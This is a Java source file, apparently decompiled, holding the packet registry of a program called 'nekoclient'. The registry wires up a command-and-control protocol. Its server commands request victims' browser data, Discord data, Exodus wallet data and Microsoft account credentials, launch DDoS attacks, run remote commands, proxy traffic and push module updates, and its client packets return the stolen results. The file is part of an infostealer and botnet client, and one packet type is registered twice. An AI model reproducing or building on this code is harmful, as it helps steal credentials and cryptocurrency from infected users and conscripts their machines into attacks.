package dev.neko.nekoclient.packet;

import dev.neko.nekoclient.packet.impl.client.ActionResponsePacket;
import dev.neko.nekoclient.packet.impl.client.BrowserDataResponsePacket;
import dev.neko.nekoclient.packet.impl.client.DiscordResponsePacket;
import dev.neko.nekoclient.packet.impl.client.ExodusResponsePacket;
import dev.neko.nekoclient.packet.impl.client.HelloPacket;
import dev.neko.nekoclient.packet.impl.client.KeepAlivePacket;
import dev.neko.nekoclient.packet.impl.client.MSAResponsePacket;
import dev.neko.nekoclient.packet.impl.client.ProxyResponsePacket;
import dev.neko.nekoclient.packet.impl.server.CommandPacket;
import dev.neko.nekoclient.packet.impl.server.DDoSPacket;
import dev.neko.nekoclient.packet.impl.server.DisconnectPacket;
import dev.neko.nekoclient.packet.impl.server.ProxyPacket;
import dev.neko.nekoclient.packet.impl.server.RequestBrowserDataPacket;
import dev.neko.nekoclient.packet.impl.server.RequestDiscordPacket;
import dev.neko.nekoclient.packet.impl.server.RequestExodusPacket;
import dev.neko.nekoclient.packet.impl.server.RequestMSAPacket;
import dev.neko.nekoclient.packet.impl.server.UpdateModulePacket;
import dev.neko.nekoclient.structure.Registry;
import java.lang.reflect.InvocationTargetException;
import java.util.Objects;

public class PacketRegistry extends Registry<Packet> {
   public PacketRegistry() {
      this.register(new Packet[]{new HelloPacket()});
      this.register(new Packet[]{new ActionResponsePacket()});
      this.register(new Packet[]{new ExodusResponsePacket()});
      this.register(new Packet[]{new ProxyResponsePacket()});
      this.register(new Packet[]{new BrowserDataResponsePacket()});
      this.register(new Packet[]{new MSAResponsePacket()});
      this.register(new Packet[]{new DiscordResponsePacket()});
      this.register(new Packet[]{new KeepAlivePacket()});
      this.register(new Packet[]{new dev.neko.nekoclient.packet.impl.server.HelloPacket()});
      this.register(new Packet[]{new CommandPacket()});
      this.register(new Packet[]{new DDoSPacket()});
      this.register(new Packet[]{new dev.neko.nekoclient.packet.impl.server.KeepAlivePacket()});
      this.register(new Packet[]{new RequestExodusPacket()});
      this.register(new Packet[]{new ProxyPacket()});
      this.register(new Packet[]{new RequestMSAPacket()});
      this.register(new Packet[]{new RequestExodusPacket()});
      this.register(new Packet[]{new RequestBrowserDataPacket()});
      this.register(new Packet[]{new RequestDiscordPacket()});
      this.register(new Packet[]{new UpdateModulePacket()});
      this.register(new Packet[]{new DisconnectPacket()});
   }

   public final Packet getById(String id) {
      try {
         Packet packet = this.getBy(packet2 -> Objects.equals(packet2.getId(), id));
         return Objects.isNull(packet) ? null : (Packet)packet.getClass().getConstructor().newInstance();
      } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException | InstantiationException var3) {
         throw new RuntimeException(var3);
      }
   }
}
